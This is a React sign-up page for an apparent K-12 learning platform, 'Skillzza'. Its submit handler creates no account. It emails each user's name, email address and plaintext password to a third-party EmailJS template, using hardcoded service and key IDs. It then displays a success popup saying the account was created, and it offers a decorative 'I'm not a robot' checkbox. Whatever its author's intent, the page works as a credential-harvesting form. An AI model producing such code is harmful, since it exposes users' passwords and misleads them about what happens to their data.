import React, { useEffect, useState } from 'react';
import Navbar from './components/Navbar';
import Footer from './components/Footer';
import emailjs from '@emailjs/browser';

export default function SignupApp() {
  const [isRobotChecked, setIsRobotChecked] = useState(false);
  const [isSignUp, setIsSignUp] = useState(true);
  const [showPopup, setShowPopup] = useState(false);
  const [loading, setLoading] = useState(false);
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isRobotChecked) return;
    setLoading(true);

    const templateParams = {
      form_name: "Sign Up Form",
      user_name: fullName,
      user_email: email,
      user_role: "N/A",
      user_message: `Attempted signup with password: ${password}`
    };

    emailjs.send(
      'service_6c66tcm', 
      'template_wt0w8kn', 
      templateParams,
      'CM_nb8U7I8dEOty2d'
    )
    .then(() => {
      setShowPopup(true);
      setLoading(false);
      setFullName('');
      setEmail('');
      setPassword('');
    })
    .catch((err) => {
      console.error('FAILED...', err);
      alert('Failed to process sign up. Please try again.');
      setLoading(false);
    });
  };
  useEffect(() => {
    document.title = 'Log In | Skillzza';
  }, []);

  return (
    <div className="flex flex-col min-h-screen">
      <Navbar />

      <div className="flex-1 flex items-center justify-center relative overflow-hidden bg-[#1A0B2E] font-poppins py-20 pt-[150px] pb-[100px]">

        {/* Background Animated Orbs */}
        <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-[#6C3CF7] mix-blend-screen filter blur-[120px] opacity-40 animate-blob"></div>
        <div className="absolute bottom-[-10%] right-[-10%] w-[600px] h-[600px] rounded-full bg-[#FF00FF] mix-blend-screen filter blur-[150px] opacity-30 animate-blob animation-delay-2000"></div>
        <div className="absolute top-[40%] left-[60%] w-[400px] h-[400px] rounded-full bg-[#3B6CFF] mix-blend-screen filter blur-[100px] opacity-30 animate-blob animation-delay-4000"></div>

        {/* Main Container */}
        <div className="relative z-10 w-full max-w-[1000px] mx-auto p-4 md:p-8 flex flex-col md:flex-row gap-6 md:gap-8 items-stretch justify-center">

          {/* Left Card - Branding */}
          <div className="w-full md:w-1/2 p-8 md:p-12 rounded-[24px] text-white shadow-2xl relative overflow-hidden flex flex-col justify-center min-h-[480px]"
            style={{
              background: 'linear-gradient(135deg, #6C3CF7 0%, #4200FF 100%)',
              boxShadow: '0 25px 50px -12px rgba(108, 60, 247, 0.4)'
            }}>

            {/* Decorative subtle overlay */}
            <div className="absolute top-0 left-0 w-full h-full opacity-10 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-white to-transparent"></div>

            <div className="relative z-10">
              <h1 className="text-4xl md:text-5xl font-semibold mb-4 leading-[1.2] tracking-[-0.5px]">
                <span className="block mb-2">Join</span>
                <span className="block">Skillzza K-12</span>
              </h1>
              <p className="text-white/85 text-[15px] md:text-[17px] leading-relaxed mb-6 font-medium">
                Start your learning and collaboration journey with a secure, modern workspace.
              </p>
              <p className="text-white/95 text-[15px] md:text-[17px] leading-relaxed font-medium">
                Build your profile, join curated councils and communities, and unlock personalized growth recommendations-all from one place.
              </p>
            </div>
          </div>

          {/* Right Card - Form */}
          <div className="w-full md:w-1/2 bg-white/95 backdrop-blur-xl p-8 md:p-12 rounded-[24px] shadow-2xl relative border border-white/20 min-h-[480px] flex flex-col justify-center h-auto">

            <h2 className="text-[28px] md:text-[32px] font-bold text-[#1A1A2E] mb-2 tracking-tight">
              {isSignUp ? "Create Account" : "Log In"}
            </h2>
            <p className="text-[#6B7280] text-[14px] mb-8 font-medium">
              {isSignUp ? "Sign up to get started" : "Enter your credentials to continue"}
            </p>

            <form className="flex flex-col gap-5" onSubmit={handleSubmit}>

              {/* Name Field (Only in Sign Up) */}
              {isSignUp && (
                <div className="flex flex-col gap-1.5">
                  <label className="text-[13px] font-semibold text-[#374151] ml-1">Full Name</label>
                  <input
                    type="text"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    placeholder="Enter your full name"
                    className="w-full px-4 py-3.5 rounded-xl border border-gray-200 bg-gray-50/50 text-[#1A1A2E] text-[14px] focus:outline-none focus:ring-2 focus:ring-[#6C3CF7]/40 focus:border-[#6C3CF7] transition-all"
                    required
                  />
                </div>
              )}

              {/* Email Field */}
              <div className="flex flex-col gap-1.5">
                <label className="text-[13px] font-semibold text-[#374151] ml-1">Email address</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="name@school.com"
                  className="w-full px-4 py-3.5 rounded-xl border border-gray-200 bg-gray-50/50 text-[#1A1A2E] text-[14px] focus:outline-none focus:ring-2 focus:ring-[#6C3CF7]/40 focus:border-[#6C3CF7] transition-all"
                  required
                />
              </div>

              {/* Password Field */}
              <div className="flex flex-col gap-1.5">
                <label className="text-[13px] font-semibold text-[#374151] ml-1">
                  {isSignUp ? "Create Password" : "Password"}
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder={isSignUp ? "Create a strong password" : "Enter your password"}
                  className="w-full px-4 py-3.5 rounded-xl border border-gray-200 bg-gray-50/50 text-[#1A1A2E] text-[14px] focus:outline-none focus:ring-2 focus:ring-[#6C3CF7]/40 focus:border-[#6C3CF7] transition-all"
                  required
                />
              </div>

              {/* Options Row */}
              <div className="flex items-center justify-between mt-1 mb-2">
                <label className="flex items-center gap-2 cursor-pointer group">
                  <input
                    type="checkbox"
                    checked={isRobotChecked}
                    onChange={(e) => setIsRobotChecked(e.target.checked)}
                    className="w-4 h-4 rounded border-gray-300 text-[#6C3CF7] focus:ring-[#6C3CF7] cursor-pointer"
                  />
                  <span className="text-[14px] font-medium text-[#4B5563] group-hover:text-[#1A1A2E] transition-colors">I'm not a robot</span>
                </label>

                <a href="#" className="text-[13px] font-bold text-[#6C3CF7] hover:text-[#4200FF] transition-colors">
                  Forgot password?
                </a>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={!isRobotChecked || loading}
                className={`w-full font-bold text-[15px] py-4 rounded-xl transition-all duration-200 ${(!isRobotChecked || loading)
                  ? "bg-gray-300 text-gray-500 cursor-not-allowed"
                  : "bg-[#6C3CF7] hover:bg-[#5B2CE0] text-white shadow-[0_8px_20px_-6px_rgba(108,60,247,0.5)] hover:shadow-[0_12px_25px_-6px_rgba(108,60,247,0.6)] transform hover:-translate-y-[1px]"
                  }`}
              >
                {loading ? "Processing..." : (isSignUp ? "Create Account" : "Log In")}
              </button>

            </form>

            {/* Footer */}
            <div className="mt-8 text-center">
              {isSignUp ? (
                <p className="text-[14px] text-[#6B7280] font-medium">
                  Already have an account? <button onClick={(e) => { e.preventDefault(); window.location.href = '/login'; }} className="text-[#6C3CF7] font-bold hover:underline">Log In</button>
                </p>
              ) : (
                <p className="text-[14px] text-[#6B7280] font-medium">
                  New here? <button onClick={(e) => { e.preventDefault(); setIsSignUp(true); }} className="text-[#6C3CF7] font-bold hover:underline">Create account</button>
                </p>
              )}
            </div>

          </div>

        </div>

        {/* Modern Success Popup */}
        {showPopup && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm animate-fadeIn">
            <div className="bg-white rounded-[24px] shadow-2xl p-8 max-w-sm w-full text-center relative animate-slideUp scale-95 border border-white/50">
              {/* Animated Check Icon */}
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg className="w-10 h-10 text-green-500 animate-checkmark" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path>
                </svg>
              </div>

              <h3 className="text-2xl font-bold text-[#1A1A2E] mb-2">
                {isSignUp ? "Welcome!" : "Welcome Back!"}
              </h3>
              <p className="text-[#6B7280] text-[15px] mb-8 font-medium">
                {isSignUp
                  ? "Your account has been created successfully."
                  : "You have been logged in successfully."}
              </p>

              <button
                onClick={() => window.location.href = '/'}
                className="w-full bg-[#1A1A2E] hover:bg-black text-white font-bold py-3.5 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-[1px]"
              >
                Continue
              </button>
            </div>
          </div>
        )}

        <style>{`
        @keyframes blob {
          0% { transform: translate(0px, 0px) scale(1); }
          33% { transform: translate(30px, -50px) scale(1.1); }
          66% { transform: translate(-20px, 20px) scale(0.9); }
          100% { transform: translate(0px, 0px) scale(1); }
        }
        .animate-blob {
          animation: blob 7s infinite;
        }
        .animation-delay-2000 {
          animation-delay: 2s;
        }
        .animation-delay-4000 {
          animation-delay: 4s;
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out forwards;
        }
        @keyframes slideUp {
          from { opacity: 0; transform: translateY(20px) scale(0.95); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .animate-slideUp {
          animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }
        @keyframes checkmark {
          0% { stroke-dasharray: 0, 100; opacity: 0; }
          100% { stroke-dasharray: 100, 0; opacity: 1; }
        }
        .animate-checkmark {
          animation: checkmark 0.6s ease-out forwards;
        }
      `}</style>
      </div>

      <Footer />
    </div>
  );
}
